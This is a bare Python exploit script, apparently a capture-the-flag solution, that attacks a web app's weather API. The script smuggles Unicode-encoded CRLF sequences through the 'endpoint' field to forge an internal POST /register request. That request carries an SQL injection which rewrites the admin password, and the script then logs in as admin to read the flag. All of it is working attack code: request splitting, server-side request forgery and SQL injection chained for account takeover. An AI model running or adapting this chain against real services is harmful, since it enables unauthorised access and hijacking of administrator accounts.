import requests

url = "http://159.65.92.99:30886/api/weather/"
loginURL = "http://159.65.92.99:30886/login"

line1 = "\u010D"
line2 = "\u010A"
space =  "\u0120"


endpoint = "localhost/a"

username = "admin"
password = "admin') ON CONFLICT(username) DO UPDATE SET password = 'xon1l';--"

parsedUsername = username.replace(" ","\u0120").replace("'",'%27').replace('"','%22')
parsedPW = password.replace(" ","\u0120").replace("'",'%27').replace('"','%22')

contentLength = len(parsedUsername) + len(parsedPW) + 19
# 19 = len(username=) + len(password=) + len(&)
# HTTP SMUGGLING
payload = endpoint+f"\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHOST:127.0.0.1\u010D\u010AContent-Type:application/x-www-form-urlencoded\u010D\u010AContent-Length:{contentLength}\u010D\u010A\u010D\u010Ausername={parsedUsername}&password={parsedPW}\u010D\u010A\u010D\u010AGET\u0120/?q="

res = requests.post(url,json={"endpoint":payload,"city":"HANOI","country":"VN"})

getFlag = requests.post(loginURL, json={"username":"admin","password":"xon1l"})

print(getFlag.text)